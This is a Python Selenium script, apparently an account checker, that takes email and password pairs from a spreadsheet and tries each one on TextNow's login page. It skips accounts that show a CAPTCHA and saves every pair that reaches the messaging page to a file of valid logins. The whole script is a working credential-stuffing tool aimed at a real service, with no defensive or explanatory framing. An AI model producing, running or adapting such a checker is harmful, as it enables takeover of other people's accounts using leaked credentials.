from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from openpyxl import load_workbook, Workbook
import time
import sys

# Load Excel
wb = load_workbook("credentials.xlsx")
sheet = wb.active

# Create output workbook
output_wb = Workbook()
output_ws = output_wb.active
output_ws.title = "Valid Emails"
output_ws.append(["Email", "Password"])

# Process each login
for row in sheet.iter_rows(min_row=2, values_only=True):
    email, password = row[:2]  # Only take the first two columns

    # Setup Chrome driver for each account
    service = Service("chromedriver.exe")
    driver = webdriver.Chrome(service=service)

    try:
        driver.get("https://www.textnow.com/login?redirectTo=/messaging")
        time.sleep(3)

        # Input email
        email_input = driver.find_element(By.NAME, "username")
        email_input.clear()
        email_input.send_keys(email)

        # Input password
        password_input = driver.find_element(By.NAME, "password")
        password_input.clear()
        password_input.send_keys(password)

        # Click login
        login_button = driver.find_element(By.XPATH, "//button[@type='submit']")
        login_button.click()

        time.sleep(5)

        # Check for CAPTCHA popup
        try:
            captcha = driver.find_element(By.XPATH, "//div[contains(text(), 'Verify you are a human')]")
            if captcha.is_displayed():
                print(f"❌ CAPTCHA detected for: {email}, skipping.")
                driver.quit()
                continue  # Skip to next account
        except:
            pass  # CAPTCHA not found, continue as normal

        # Check if login successful (redirect to messaging or similar)
        if "messaging" in driver.current_url.lower():
            print(f"✅ Success: {email}")
            output_ws.append([email, password])
            output_wb.save("successful_login.xlsx")  # Save after each success
        else:
            print(f"❌ Failed: {email}")

    except Exception as e:
        print(f"⚠️ Error logging in with {email}: {str(e)}")
    finally:
        driver.quit()  # Always close the browser

print("✅ All emails processed. Results saved in successful_login.xlsx.")
sys.exit(0)
